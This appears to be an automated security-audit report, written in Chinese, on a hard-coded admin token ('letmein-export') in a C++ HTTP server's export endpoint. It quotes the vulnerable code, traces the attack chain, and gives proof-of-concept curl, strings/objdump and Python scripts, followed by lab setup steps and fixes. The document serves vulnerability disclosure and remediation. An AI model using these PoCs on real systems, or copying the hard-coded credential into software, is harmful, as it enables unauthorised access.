# VULN-SEC-CPP-SECRET-FILE-001: 管理员导出端点硬编码认证令牌可被二进制提取导致未授权访问

**严重性**: Critical | **CWE**: CWE-798 (Use of Hard-coded Credentials) | **置信度**: 95/100
**位置**: `src/file_cache.cpp:22` @ `exportSnapshot`
**语言/框架**: C++ / 自定义 HTTP 服务器
**分析类型**: secret
**Source/Sink**: network_request → credential_comparison
**规则/证据来源**: c_cpp.secret.hardcoded_token / llm

---

## 1. 漏洞细节

管理员导出端点 `GET /admin/export` 使用硬编码字符串 `"letmein-export"` 作为唯一的认证凭据。该令牌直接以字符串字面量的形式嵌入在 `FileCache::exportSnapshot()` 函数中（`src/file_cache.cpp:22`），与用户通过 HTTP 查询参数传入的 `token` 值进行简单字符串比较。

该实现存在以下严重安全缺陷：

1. **令牌硬编码在源代码中**：认证凭据作为编译时常量存在，无法在不重新编译的情况下轮换或修改。
2. **二进制可提取**：编译后的 ELF 二进制文件中，该字符串字面量存储在 `.rodata` 段，攻击者只需获取二进制文件即可通过 `strings` 或 `objdump` 命令直接提取。
3. **无外部密钥管理**：代码中不存在任何 `getenv()` 调用、配置文件加载机制或外部密钥管理系统集成。
4. **无额外认证层**：没有 IP 白名单、速率限制、会话验证或多因素认证。
5. **监听所有网络接口**：HTTP 服务器绑定到 `INADDR_ANY`（0.0.0.0），使该端点对所有网络接口可达。

### 证据摘要

- **触发源**: network_request — HTTP GET 请求的 `token` 查询参数
- **危险点**: credential_comparison — 与硬编码字符串 `"letmein-export"` 进行比较
- **已检查的清洗/缓解**: 无。代码库中未发现 `getenv()` 调用、配置文件加载、CLI 参数传递或外部密钥管理。`FileCache` 构造函数仅接受 `baseDir` 参数，无令牌注入途径。
- **关键证据**:
  - `file_cache.cpp:22` 中 `token != "letmein-export"` 为编译时常量比较
  - `main.cpp:28` 中 `argv[1]` 仅用于端口号，无令牌参数
  - `http_server.cpp:92` 中 `address.sin_addr.s_addr = INADDR_ANY` 确认监听所有网络接口
  - 项目目录中不存在 `.env`、`.yaml`、`.json`、`.conf` 等配置文件
  - 审计日志（`audit_log.hpp`）仅记录事件，无速率限制或阻断机制

## 2. 漏洞代码

**文件**: `src/file_cache.cpp` (行 21-31)

```cpp
std::string FileCache::exportSnapshot(const std::string& token) const {
  if (token != "letmein-export") {    // ← 第22行: 硬编码认证令牌
    return "denied\n";
  }

  std::ostringstream out;
  out << "users=3\n";                 // 泄露: 用户数量
  out << "last_backup=disabled\n";    // 泄露: 备份状态
  out << "data_dir=" << baseDir_ << "\n";  // 泄露: 数据目录路径
  return out.str();
}
```

**文件**: `src/main.cpp` (行 70-74) — 路由注册与参数传递

```cpp
server.route("GET", "/admin/export", [&](const HttpRequest& request) {
  std::string token = queryValue(request, "token");  // 从HTTP查询参数提取token
  audit.event("admin", "export", token);              // 仅记录审计日志，无验证
  return text(200, files.exportSnapshot(token));      // 直接传递给硬编码比较
});
```

**文件**: `src/http_server.cpp` (行 90-93) — 网络绑定

```cpp
sockaddr_in address {};
address.sin_family = AF_INET;
address.sin_addr.s_addr = INADDR_ANY;   // ← 绑定所有网络接口 (0.0.0.0)
address.sin_port = htons(static_cast<uint16_t>(port_));
```

**代码分析**：

- `exportSnapshot()` 函数在第 22 行将用户输入与硬编码字符串 `"letmein-export"` 进行直接比较，这是唯一的认证机制。
- `main.cpp:71` 中 `queryValue()` 从 HTTP 请求的查询参数中提取 `token` 值，无任何预处理或验证。
- `main.cpp:73` 将提取的 token 直接传递给 `exportSnapshot()`，中间无任何安全过滤。
- 认证成功后返回的敏感信息包括：用户数量、备份状态和数据目录路径，这些信息可被用于进一步的攻击侦察。

## 3. 完整攻击链路

```
[入口点] GET /admin/export?token=XXX
  @ HttpServer::run() → parseRequest() @ src/http_server.cpp:105-119
  ↓ HTTP 请求通过 TCP 连接到达，recv() 接收原始数据，parseRequest() 解析查询参数
[参数提取] queryValue(request, "token")
  @ src/main.cpp:71
  ↓ 从 request.query map 中提取 "token" 键对应的值，无任何验证或清洗
[审计记录] audit.event("admin", "export", token)
  @ src/main.cpp:72
  ↓ 仅写入日志文件，无速率限制、无异常检测、无阻断机制
[令牌验证] token != "letmein-export"
  @ FileCache::exportSnapshot() @ src/file_cache.cpp:22
  ↓ 与硬编码字符串进行简单比较，匹配则继续执行
[信息泄露] 返回系统快照数据
  @ src/file_cache.cpp:26-30
  ↓ 返回 users=3, last_backup=disabled, data_dir=data 等敏感信息
```

**攻击链路详细说明**：

1. **网络接入**（`http_server.cpp:105-113`）：HTTP 服务器在 `INADDR_ANY:8080` 上监听，通过 `accept()` 接受任意来源的 TCP 连接，`recv()` 读取最多 4096 字节的 HTTP 请求数据。无任何 TLS 加密、IP 过滤或连接限制。

2. **请求解析**（`http_server.cpp:42-69`）：`parseRequest()` 解析 HTTP 请求行和查询字符串，将 `token` 参数存入 `request.query` map。URL 解码未实现，但 `"letmein-export"` 不含特殊字符，无需编码即可直接传递。

3. **路由分发**（`http_server.cpp:120-128`）：根据 `"GET /admin/export"` 键查找注册的处理器（handler），找到后调用 `main.cpp:70` 注册的 lambda 函数。

4. **参数提取**（`main.cpp:71`）：`queryValue()` 从 `request.query` 中查找 `"token"` 键，直接返回其值。若不存在则返回空字符串。

5. **硬编码比较**（`file_cache.cpp:22`）：传入的 token 与编译时常量 `"letmein-export"` 进行 `std::string::operator!=` 比较。匹配时执行导出逻辑，不匹配时返回 `"denied\n"`。

6. **信息泄露**（`file_cache.cpp:26-30`）：认证成功后返回包含系统内部信息的文本，包括用户数量、备份状态和数据目录路径。

## 4. 攻击场景

**攻击者画像**: 任何能够访问目标服务器 8080 端口的远程未认证用户。攻击者无需任何账号凭据，仅需网络可达性。包括外部攻击者（若端口暴露于公网）、内部网络中的横向移动攻击者、或获得了二进制文件的逆向工程人员。

**攻击向量**: 通过 HTTP GET 请求直接访问 `/admin/export` 端点，在查询参数中携带硬编码令牌。

**利用难度**: **低**

### 攻击步骤

1. **获取令牌**（二选一）：
   - **方式 A — 二进制提取**：获取编译后的 `edge-gateway` 二进制文件，执行 `strings edge-gateway | grep letmein` 即可提取令牌 `"letmein-export"`。
   - **方式 B — 源码泄露**：若源代码仓库被泄露（如 Git 仓库公开），直接阅读 `src/file_cache.cpp:22` 即可获取令牌。
   - **方式 C — 暴力猜测**：令牌 `"letmein-export"` 为简单英文组合词，可被字典攻击猜中。

2. **发送请求**：向目标服务器发送 HTTP GET 请求：
   ```
   GET /admin/export?token=letmein-export HTTP/1.1
   Host: target:8080
   ```

3. **获取敏感信息**：服务器返回包含系统内部信息的响应：
   ```
   users=3
   last_backup=disabled
   data_dir=data
   ```

4. **利用泄露信息**：
   - `data_dir=data` 暴露了数据目录路径，可配合路径遍历漏洞（如 `VULN-DF-CPP-PATHTRAV-FILE-001`）进一步读取敏感文件。
   - `last_backup=disabled` 表明系统无备份保护，增加了数据破坏攻击的吸引力。
   - `users=3` 提供了系统规模信息，辅助攻击者评估攻击价值。

## 5. 攻击条件

| 条件类型   | 要求           | 说明                                                                                     |
| ---------- | -------------- | ---------------------------------------------------------------------------------------- |
| 网络可达性 | 端口 8080 可达 | 服务器绑定 `INADDR_ANY`，任何能访问目标 8080 端口的主机均可发起攻击。无 TLS 加密。       |
| 认证要求   | 无             | 仅需知道硬编码令牌 `"letmein-export"`，无需用户账号或会话。                              |
| 配置依赖   | 无             | 漏洞存在于默认代码中，无需任何特殊配置即可触发。                                          |
| 环境依赖   | 无             | 所有支持 C++17 的平台均可编译运行，无操作系统或编译器特定限制。                           |
| 令牌获取   | 低难度         | 令牌可通过二进制提取（`strings` 命令）、源码审查或字典猜测获取。                          |
| 时序条件   | 无             | 无竞态条件依赖，任何时间均可触发。                                                        |

## 6. 造成影响

| 影响维度 | 等级 | 说明                                                                                               |
| -------- | ---- | -------------------------------------------------------------------------------------------------- |
| 机密性   | 高   | 直接泄露系统内部信息（用户数量、备份状态、数据目录路径）。令牌本身可从二进制中提取，使认证形同虚设。 |
| 完整性   | 低   | 导出端点为只读操作，不直接修改数据。但泄露的信息可辅助后续攻击（如路径遍历、社会工程）。             |
| 可用性   | 无   | 导出操作不影响服务正常运行。                                                                       |

**影响范围**: 

- **直接影响**：系统管理员导出接口的认证机制完全失效，任何网络可达的攻击者均可获取系统内部状态信息。
- **间接影响**：泄露的 `data_dir` 路径信息可与其他漏洞（如路径遍历漏洞）组合，形成攻击链，进一步扩大影响范围。
- **横向扩展**：若该令牌在多个系统或服务中复用（常见的开发习惯），则影响范围可扩展至所有使用该令牌的系统。

## 7. PoC (概念验证)

> ⚠️ 以下 PoC 仅供安全测试和验证使用，请勿用于非法目的。

### PoC 1: 直接利用（已知令牌）

```bash
# 向目标服务器发送带硬编码令牌的导出请求
curl -v "http://TARGET_HOST:8080/admin/export?token=letmein-export"
```

**预期输出**:
```
< HTTP/1.1 200 OK
< Content-Type: text/plain
<
users=3
last_backup=disabled
data_dir=data
```

### PoC 2: 从二进制文件提取令牌

```bash
# 从编译后的二进制文件中提取硬编码字符串
strings edge-gateway | grep -i "letmein"
# 预期输出: letmein-export

# 或使用 objdump 查看 .rodata 段
objdump -s -j .rodata edge-gateway | grep -A2 "letmein"
```

### PoC 3: Python 自动化验证脚本

```python
#!/usr/bin/env python3
"""
VULN-SEC-CPP-SECRET-FILE-001 PoC — 仅供安全测试使用
验证硬编码管理令牌的未授权访问漏洞
"""
import sys
import urllib.request
import urllib.error

def exploit(target_host, port=8080):
    url = f"http://{target_host}:{port}/admin/export?token=letmein-export"
    
    print(f"[*] 目标: {url}")
    print(f"[*] 使用硬编码令牌: letmein-export")
    
    try:
        req = urllib.request.Request(url)
        with urllib.request.urlopen(req, timeout=5) as resp:
            body = resp.read().decode()
            if resp.status == 200 and "denied" not in body:
                print(f"[+] 漏洞确认! 认证成功，获取到敏感信息:")
                print(f"    {body.strip()}")
                return True
            else:
                print(f"[-] 认证被拒绝")
                return False
    except urllib.error.URLError as e:
        print(f"[-] 连接失败: {e}")
        return False

if __name__ == "__main__":
    host = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 8080
    exploit(host, port)
```

**使用说明**: 
1. 确保目标 `edge-gateway` 服务正在运行。
2. 执行 `python3 poc.py TARGET_HOST 8080`。
3. 若返回系统快照信息（`users=3` 等），则漏洞确认。

**预期结果**: 服务器返回 HTTP 200 响应，响应体包含 `users=3`、`last_backup=disabled`、`data_dir=data` 等系统内部信息。

## 8. 验证环境搭建

### 基础环境

- **操作系统**: Linux（Ubuntu 20.04+ 或其他支持 C++17 的发行版）
- **编译器**: GCC 9+ 或 Clang 10+（需支持 C++17 标准）
- **构建工具**: CMake 3.16+
- **依赖**: 无外部库依赖，仅使用标准库和 POSIX 套接字 API

### 构建步骤

```bash
# 进入项目目录
cd /scan/project

# 创建构建目录
mkdir -p build && cd build

# 配置和编译
cmake .. -DCMAKE_BUILD_TYPE=Release
make -j$(nproc)

# 验证二进制中包含硬编码令牌
strings edge-gateway | grep "letmein-export"
# 预期输出: letmein-export
```

### 运行配置

```bash
# 创建数据目录（FileCache 需要）
mkdir -p /scan/project/data
echo "welcome" > /scan/project/data/welcome.txt

# 启动服务（默认端口 8080）
./edge-gateway

# 或指定端口
./edge-gateway 9090
```

### 验证步骤

1. **启动服务**: 在终端中运行 `./edge-gateway`，确认输出 `edge-gateway listening on port 8080`。
2. **验证令牌提取**: 在另一终端执行 `strings edge-gateway | grep letmein`，确认能从二进制中提取令牌。
3. **测试错误令牌**: 执行 `curl "http://127.0.0.1:8080/admin/export?token=wrong"`，预期返回 `denied`。
4. **测试正确令牌**: 执行 `curl "http://127.0.0.1:8080/admin/export?token=letmein-export"`，预期返回系统快照信息。
5. **验证网络可达性**: 从另一台机器执行相同 curl 命令（替换 127.0.0.1 为目标 IP），确认远程可访问。

### 预期结果

- **错误令牌**: 返回 `denied\n`，HTTP 200。
- **正确令牌**: 返回以下信息，HTTP 200：
  ```
  users=3
  last_backup=disabled
  data_dir=data
  ```
- **二进制提取**: `strings` 命令输出包含 `letmein-export`，证明令牌可从编译后的二进制中直接提取。

## 9. 修复建议

1. **移除硬编码令牌**：将认证凭据从源代码中移除，改用环境变量或外部密钥管理系统（如 HashiCorp Vault、AWS Secrets Manager）。
2. **实施安全的认证机制**：使用基于会话的认证（如 JWT）或 API 密钥机制，结合 `/login` 端点已有的用户认证体系。
3. **添加访问控制层**：对管理端点实施 IP 白名单、速率限制和请求签名验证。
4. **使用常量时间比较**：令牌比较应使用常量时间比较函数（如 `CRYPTO_memcmp`），防止时序侧信道攻击。
5. **启用 TLS**：为 HTTP 服务器添加 TLS 支持，防止令牌在网络传输中被嗅探。
6. **令牌轮换机制**：实现令牌定期轮换机制，避免长期使用固定凭据。
